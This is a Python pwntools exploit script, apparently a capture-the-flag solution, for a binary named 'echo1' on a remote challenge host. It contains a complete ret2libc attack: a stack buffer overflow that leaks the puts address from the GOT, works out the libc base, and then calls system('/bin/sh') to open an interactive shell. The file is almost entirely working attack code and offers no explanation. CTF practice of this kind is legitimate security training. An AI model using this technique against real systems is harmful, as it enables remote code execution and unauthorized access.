# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './echo1'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc/libc-2.23.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26159'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

one_gad = one_gadget(libc.path)

id_addr = 0x6020a0
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

pop_rdi = '''
pop rdi
ret
'''
sla(":",asm(pop_rdi))
cmd(1)

payload = "a"*0x28 + p64(id_addr) + p64(puts_got) + p64(puts_plt) + p64(0x000000000400818)

sla("hello",payload)
puts_addr = l64()

libc.address = puts_addr - libc.sym["puts"]
system = libc.sym["system"]
binsh = libc.search("/bin/sh").next()

payload = "a"*0x28 + p64(id_addr) + p64(binsh) + p64(system)

sla("hello",payload)

p.interactive()

'''
@File    :   echo1.py
@Time    :   2021/07/30 19:38:11
@Author  :   Niyah 
'''